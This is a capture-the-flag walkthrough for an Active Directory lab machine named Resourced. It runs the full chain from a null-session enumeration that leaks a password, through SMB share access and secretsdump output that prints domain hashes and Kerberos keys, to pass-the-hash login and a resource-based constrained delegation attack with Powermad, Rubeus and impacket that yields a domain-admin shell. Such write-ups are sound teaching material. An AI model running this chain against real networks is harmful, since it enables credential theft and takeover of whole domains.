# Resourced

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 -Pn 192.168.219.175
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-30 21:34 +08
Nmap scan report for 192.168.219.175
Host is up (0.17s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
49666/tcp open  unknown
49667/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49703/tcp open  unknown
49776/tcp open  unknown
```

This is an AD machine.&#x20;

### SMB Guest Creds -> Creds

`enum4linux` allowed for null credentials, and it listed a lot of users along with a password!

```
$ enum4linux -u '' -p '' -a 192.168.219.175
<TRUNCATED>
======================================( Users on 192.168.219.175 )======================================                                                                                 
                                                                                             
index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0xf72 RID: 0x457 acb: 0x00020010 Account: D.Durant       Name: (null)    Desc: Linear Algebra and crypto god
index: 0xf73 RID: 0x458 acb: 0x00020010 Account: G.Goldberg     Name: (null)    Desc: Blockchain expert
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xf6d RID: 0x452 acb: 0x00020010 Account: J.Johnson      Name: (null)    Desc: Networking specialist
index: 0xf6b RID: 0x450 acb: 0x00020010 Account: K.Keen Name: (null)    Desc: Frontend Developer
index: 0xf10 RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0xf6c RID: 0x451 acb: 0x00000210 Account: L.Livingstone  Name: (null)    Desc: SysAdmin
index: 0xf6a RID: 0x44f acb: 0x00020010 Account: M.Mason        Name: (null)    Desc: Ex IT admin
index: 0xf70 RID: 0x455 acb: 0x00020010 Account: P.Parker       Name: (null)    Desc: Backend Developer
index: 0xf71 RID: 0x456 acb: 0x00020010 Account: R.Robinson     Name: (null)    Desc: Database Admin
index: 0xf6f RID: 0x454 acb: 0x00020010 Account: S.Swanson      Name: (null)    Desc: Military Vet now cybersecurity specialist
index: 0xf6e RID: 0x453 acb: 0x00000210 Account: V.Ventz        Name: (null)    Desc: New-hired, reminder: HotelCalifornia194!

user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[M.Mason] rid:[0x44f]
user:[K.Keen] rid:[0x450]
user:[L.Livingstone] rid:[0x451]
user:[J.Johnson] rid:[0x452]
user:[V.Ventz] rid:[0x453]
user:[S.Swanson] rid:[0x454]
user:[P.Parker] rid:[0x455]
user:[R.Robinson] rid:[0x456]
user:[D.Durant] rid:[0x457]
user:[G.Goldberg] rid:[0x458]
<TRUNCATED>
```

In the description of the `v.ventz` user, there was a password of `HotelCalifornia194!`. Using this, we can do password spraying to test each user.&#x20;

Here's the username list:

```
Administrator
Guest
krbtgt
M.Mason
K.Keen
L.Livingstone
J.Johnson
V.Ventz
S.Swanson
P.Parker
R.Robinson
D.Durant
G.Goldberg
```

However, none of the passwords worked with any user other than `v.ventz`. This user also did not appear to be within the Remote Management Group because we were unable to `evil-winrm` in.

### SMB Shares -> Secrets Dumping

WIth our credentials, we were able to access some SMB shares, with one sticking out:

```
$ smbmap -u 'v.ventz' -p 'HotelCalifornia194!' -H 192.168.219.175
[+] IP: 192.168.219.175:445     Name: 192.168.219.175                                   
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Password Audit                                          READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share
```

We can access this share via `smbclient`:

```
$ smbclient -U 'v.ventz' '\\192.168.219.175\Password Audit'      
Password for [WORKGROUP\v.ventz]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Oct  5 16:49:16 2021
  ..                                  D        0  Tue Oct  5 16:49:16 2021
  Active Directory                    D        0  Tue Oct  5 16:49:15 2021
  registry                            D        0  Tue Oct  5 16:49:16 2021
```

These directories had some rather interesting files:

```
smb: \registry\> dir
  .                                   D        0  Tue Oct  5 16:49:16 2021
  ..                                  D        0  Tue Oct  5 16:49:16 2021
  SECURITY                            A    65536  Mon Sep 27 18:45:20 2021
  SYSTEM                              A 16777216  Mon Sep 27 18:45:20 2021

smb: \Active Directory\> dir
  .                                   D        0  Tue Oct  5 16:49:16 2021
  ..                                  D        0  Tue Oct  5 16:49:16 2021
  ntds.dit                            A 25165824  Mon Sep 27 19:30:54 2021
  ntds.jfm                            A    16384  Mon Sep 27 19:30:54 2021
```

We can download all of these files using some basic SMB commands:

```
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

Once downloaded, we can attempt to dump stuff from these files:

```
$ secretsdump.py -security ../registry/SECURITY -system ../registry/SYSTEM -ntds ntds.dit LOCAL
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x6f961da31c7ffaf16683f78e04c3e03d
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:507fdb105d9322cf53420c95780adf5f2dcdac7ca14f8b37188370c916a3fa6f2a511bb284aeac71211c939a866a2b4cc02c408e1d242ad4f5cc8f7b85d2448c18d23fb47f7b9b543a6cfb8999e40037f23dbfd8690869753979d15fe61bdcddb0ccff3d20c275207ca93e844c3b5aa1f658198225b3e54f90e0b71aaf76ba32bb1b598d189b6696c27d04674fd4c4f2c09d0df2e59fe93850aa928be813be3bd659f0d2ecba6e34fb5a3880db8155cf77e21eb44d63e1ae65abcc2aa5bdfb6bfe85e8590329929522aae501ba86d8622918e37b41daef8a2b00e78440d13e88a31fc14714923bba6fb99e13c81b3020
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x85ec8dd0e44681d9dc3ed5f0c130005786daddbd
dpapi_userkey:0x22043071c1e87a14422996eda74f2c72535d4931
[*] NL$KM 
 0000   31 BF AC 76 98 3E CF 4A  FC BD AD 0F 17 0F 49 E7   1..v.>.J......I.
 0010   DA 65 A6 F9 C7 D4 FA 92  0E 5C 60 74 E6 67 BE A7   .e.......\`t.g..
 0020   88 14 9D 4D E5 A5 3A 63  E4 88 5A AC 37 C7 1B F9   ...M..:c..Z.7...
 0030   53 9C C1 D1 6F 63 6B D1  3F 77 F4 3A 32 54 DA AC   S...ock.?w.:2T..
NL$KM:31bfac76983ecf4afcbdad0f170f49e7da65a6f9c7d4fa920e5c6074e667bea788149d4de5a53a63e4885aac37c71bf9539cc1d16f636bd13f77f43a3254daac
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 9298735ba0d788c4fc05528650553f94
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
RESOURCEDC$:1000:aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3004b16f88664fbebfcb9ed272b0565b:::
M.Mason:1103:aad3b435b51404eeaad3b435b51404ee:3105e0f6af52aba8e11d19f27e487e45:::
K.Keen:1104:aad3b435b51404eeaad3b435b51404ee:204410cc5a7147cd52a04ddae6754b0c:::
L.Livingstone:1105:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808:::
J.Johnson:1106:aad3b435b51404eeaad3b435b51404ee:3e028552b946cc4f282b72879f63b726:::
V.Ventz:1107:aad3b435b51404eeaad3b435b51404ee:913c144caea1c0a936fd1ccb46929d3c:::
S.Swanson:1108:aad3b435b51404eeaad3b435b51404ee:bd7c11a9021d2708eda561984f3c8939:::
P.Parker:1109:aad3b435b51404eeaad3b435b51404ee:980910b8fc2e4fe9d482123301dd19fe:::
R.Robinson:1110:aad3b435b51404eeaad3b435b51404ee:fea5a148c14cf51590456b2102b29fac:::
D.Durant:1111:aad3b435b51404eeaad3b435b51404ee:08aca8ed17a9eec9fac4acdcb4652c35:::
G.Goldberg:1112:aad3b435b51404eeaad3b435b51404ee:62e16d17c3015c47b4d513e65ca757a2:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:73410f03554a21fb0421376de7f01d5fe401b8735d4aa9d480ac1c1cdd9dc0c8
Administrator:aes128-cts-hmac-sha1-96:b4fc11e40a842fff6825e93952630ba2
Administrator:des-cbc-md5:80861f1a80f1232f
RESOURCEDC$:aes256-cts-hmac-sha1-96:b97344a63d83f985698a420055aa8ab4194e3bef27b17a8f79c25d18a308b2a4
RESOURCEDC$:aes128-cts-hmac-sha1-96:27ea2c704e75c6d786cf7e8ca90e0a6a
RESOURCEDC$:des-cbc-md5:ab089e317a161cc1
krbtgt:aes256-cts-hmac-sha1-96:12b5d40410eb374b6b839ba6b59382cfbe2f66bd2e238c18d4fb409f4a8ac7c5
krbtgt:aes128-cts-hmac-sha1-96:3165b2a56efb5730cfd34f2df472631a
krbtgt:des-cbc-md5:f1b602194f3713f8
M.Mason:aes256-cts-hmac-sha1-96:21e5d6f67736d60430facb0d2d93c8f1ab02da0a4d4fe95cf51554422606cb04
M.Mason:aes128-cts-hmac-sha1-96:99d5ca7207ce4c406c811194890785b9
M.Mason:des-cbc-md5:268501b50e0bf47c
K.Keen:aes256-cts-hmac-sha1-96:9a6230a64b4fe7ca8cfd29f46d1e4e3484240859cfacd7f67310b40b8c43eb6f
K.Keen:aes128-cts-hmac-sha1-96:e767891c7f02fdf7c1d938b7835b0115
K.Keen:des-cbc-md5:572cce13b38ce6da
L.Livingstone:aes256-cts-hmac-sha1-96:cd8a547ac158c0116575b0b5e88c10aac57b1a2d42e2ae330669a89417db9e8f
L.Livingstone:aes128-cts-hmac-sha1-96:1dec73e935e57e4f431ac9010d7ce6f6
L.Livingstone:des-cbc-md5:bf01fb23d0e6d0ab
J.Johnson:aes256-cts-hmac-sha1-96:0452f421573ac15a0f23ade5ca0d6eada06ae85f0b7eb27fe54596e887c41bd6
J.Johnson:aes128-cts-hmac-sha1-96:c438ef912271dbbfc83ea65d6f5fb087
J.Johnson:des-cbc-md5:ea01d3d69d7c57f4
V.Ventz:aes256-cts-hmac-sha1-96:4951bb2bfbb0ffad425d4de2353307aa680ae05d7b22c3574c221da2cfb6d28c
V.Ventz:aes128-cts-hmac-sha1-96:ea815fe7c1112385423668bb17d3f51d
V.Ventz:des-cbc-md5:4af77a3d1cf7c480
S.Swanson:aes256-cts-hmac-sha1-96:8a5d49e4bfdb26b6fb1186ccc80950d01d51e11d3c2cda1635a0d3321efb0085
S.Swanson:aes128-cts-hmac-sha1-96:6c5699aaa888eb4ec2bf1f4b1d25ec4a
S.Swanson:des-cbc-md5:5d37583eae1f2f34
P.Parker:aes256-cts-hmac-sha1-96:e548797e7c4249ff38f5498771f6914ae54cf54ec8c69366d353ca8aaddd97cb
P.Parker:aes128-cts-hmac-sha1-96:e71c552013df33c9e42deb6e375f6230
P.Parker:des-cbc-md5:083b37079dcd764f
R.Robinson:aes256-cts-hmac-sha1-96:90ad0b9283a3661176121b6bf2424f7e2894079edcc13121fa0292ec5d3ddb5b
R.Robinson:aes128-cts-hmac-sha1-96:2210ad6b5ae14ce898cebd7f004d0bef
R.Robinson:des-cbc-md5:7051d568dfd0852f
D.Durant:aes256-cts-hmac-sha1-96:a105c3d5cc97fdc0551ea49fdadc281b733b3033300f4b518f965d9e9857f27a
D.Durant:aes128-cts-hmac-sha1-96:8a2b701764d6fdab7ca599cb455baea3
D.Durant:des-cbc-md5:376119bfcea815f8
G.Goldberg:aes256-cts-hmac-sha1-96:0d6ac3733668c6c0a2b32a3d10561b2fe790dab2c9085a12cf74c7be5aad9a91
G.Goldberg:aes128-cts-hmac-sha1-96:00f4d3e907818ce4ebe3e790d3e59bf7
G.Goldberg:des-cbc-md5:3e20fd1a25687673
[*] Cleaning up...
```

Loads of hashes available. Now the question is which user is part of the Remote Management Group?&#x20;

### Bloodhound -> Shell

We can use `bloodhound-python` to query the domain using the existing credentials we have.&#x20;

```
$ bloodhound-python -d resourced.local -u v.ventz -p 'HotelCalifornia194!' -c all -ns 192.168.219.175
INFO: Found AD domain: resourced.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: resourcedc.resourced.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: resourcedc.resourced.local
INFO: Found 14 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: ResourceDC.resourced.local
INFO: Done in 00M 33S
```

We can then upload all of this information to `bloodhound`. Then, we find that `l.livingstone` is part of the Remote Management Group:

<figure><img src="../../../.gitbook/assets/image (3875).png" alt=""><figcaption></figcaption></figure>

We can then `evil-winrm` in by passing the hash.&#x20;

<figure><img src="../../../.gitbook/assets/image (3850).png" alt=""><figcaption></figcaption></figure>

Then, we can grab the user flag.

## Privilege Escalation

### GenericAll -> DA Fail

When viewing the outbound privileges that this user has, we see that they have GenericAll permissions over the DC:

<figure><img src="../../../.gitbook/assets/image (2136).png" alt=""><figcaption></figcaption></figure>

This means that the user has full control over the DC and we can basically do whatever we want. We can abuse this to get an administrator shell via RCBD:

{% embed url="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution" %}

Bloodhound also provides some commands to abuse this. Here are the commands I used:

<pre class="language-powershell"><code class="lang-powershell"><strong>## import modules
</strong><strong>. .\powermad.ps1
</strong>. .\power.ps1
New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Password@123' -AsPlainText -Force)
$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer resourcedc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
.\Rubeus.exe hash /password:Password@123 ## A29F7623FD11550DEF0192DE9246F46B
.\Rubeus.exe s4u /user:attackersystem$ /rc4:A29F7623FD11550DEF0192DE9246F46B /impersonateuser:administrator /msdsspn:cifs/resourcedc.resourced.local /ptt
</code></pre>

Once we have run these, it should work and we can check `klist` to see that we have the administrator's ticket:

<figure><img src="../../../.gitbook/assets/image (1759).png" alt=""><figcaption></figcaption></figure>

However, even with this ticket, it appears we still cannot access the administrator's desktop (and also we still don't have a shell...)

<figure><img src="../../../.gitbook/assets/image (543).png" alt=""><figcaption></figcaption></figure>

### Proper DA Shell

This machine account fails to be useful to us because we aren't pivoting to another machine in the domain from this one. Instead, we can still use this machine account by simply requesting for the administrator ticket using `impacket-getST` on our Kali machine, which we can then use to get a shell as the administrator.&#x20;

{% hint style="info" %}
This might be possible with PsExec.exe on the domain itself, but I didn't test it out.&#x20;
{% endhint %}

```
$ impacket-getST -spn cifs/resourcedc.resourced.local resourced/attackersystem\$:'Password@123' -impersonate Administrator -dc-ip 192.168.219.175
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

Then, we can import this ticket into `KRB5CCNAME` and use it to get a shell:

```
$ export KRB5CCNAME=./Administrator.ccache
$ sudo impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.219.175
```

<figure><img src="../../../.gitbook/assets/image (3460).png" alt=""><figcaption></figcaption></figure>

Rooted!
